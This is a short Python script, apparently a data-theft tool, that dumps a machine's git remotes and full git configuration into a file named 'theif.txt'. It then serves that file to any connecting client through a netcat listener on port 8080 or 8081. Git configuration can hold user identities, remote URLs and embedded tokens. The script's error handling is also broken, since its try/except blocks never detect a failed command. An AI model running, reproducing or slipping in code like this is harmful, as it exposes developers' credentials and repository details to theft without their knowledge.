#!/usr/bin/env python3
from os import system,name
try:
    system('git --version')
    print("git installed in the system")
except Exception:
    print("This is not a git directory")
    exit()
def linux():
    f=open("theif.txt",'w+')
    system("git remote -v >> theif.txt")
    system("git config --list >> theif.txt")
    f.close()
    try:
        system(f"nc -nlvp 8080 < theif.txt")
    except:
        try:
            system(f"nc -nlvp 8081 < theif.txt")
        except:
            print("it is not workiking exiting")
            exit()
    print("Thanks for using this tool")
if name!='posix':
    print("This file is not compatible in this system")
    exit()
linux()    

    

